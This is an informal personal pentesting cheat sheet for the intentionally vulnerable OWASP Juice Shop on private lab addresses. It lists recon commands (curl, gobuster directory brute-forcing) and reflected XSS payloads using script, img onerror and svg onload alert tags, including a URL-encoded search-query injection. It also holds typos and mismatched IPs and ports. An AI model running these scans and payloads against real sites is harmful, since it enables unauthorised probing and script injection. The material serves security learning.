"MY PENTESTING SUMMARY TO CHECK WEB VUNEVERABILITY"

"first step run this command to attacker server To check reachability and headers "
url -I http://192.168.168.130:3030

"second run command bellow to quick check the page source, Check if the page contains certain elements, scripts, or text, Check for frameworks / libraries"

curl http://192.168.58.130:3000 | head -n 20

#third to scan hidden endpoints"

gobuster dir -u http://192.168.168.130:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20

# Reflected XSS (quick & visual) — test search or input fields with a harmless payload and confirm an alert popup."

# try steps below "

Open Juice Shop and focus the search box.

Paste one of these payloads and press Enter.

Payloads (start simple — they show a popup if the site is vulnerable):

<script>alert(1)</script>

"><script>alert(1)</script>

'><script>alert(1)</script>

<img src=x onerror=alert(1)>

"><img src=x onerror=alert(1)>

If you see a browser alert popup with 1, the input was reflected and executed — that’s reflected XSS.

#if not work try below"

#Open DevTools → Elements, then use Ctrl+F inside Elements and paste your payload"

<img src=x onerror=alert('XSS')>

"><img src=x onerror=alert('XSS')>

<svg onload=alert('XSS')>

"><svg/onload=alert('XSS')>

# other option"
Check Network to find the parameter name the search uses:

DevTools → Network → clear → perform the search.

Look for an XHR/fetch entry and inspect Query String Parameters (common name: q or search).

when see the searchq= under file and the polyfils.js:1(xhr) under initiator run the script below in the browser

http://192.168.58.130:3000/#/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E







